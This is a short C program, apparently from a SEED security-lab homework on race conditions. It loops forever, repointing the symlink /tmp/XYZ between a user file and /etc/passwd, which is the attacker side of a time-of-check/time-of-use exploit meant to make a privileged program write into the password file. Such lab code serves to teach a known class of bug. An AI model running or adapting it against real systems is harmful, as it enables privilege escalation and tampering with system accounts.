#include <stdlib.h>
#include <sys/param.h>
#include <unistd.h>
#include <stdio.h>

void main(){
	int i =0;
	while(1)
	{
		printf(" %d times attempt\n", i);
		unlink("/tmp/XYZ");
		symlink("/home/seed/Desktop/CSOS/HW1/RaceCondition/textRes.txt", "/tmp/XYZ");
		usleep(10000);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(10000);
		i = i + 1;
	}
}
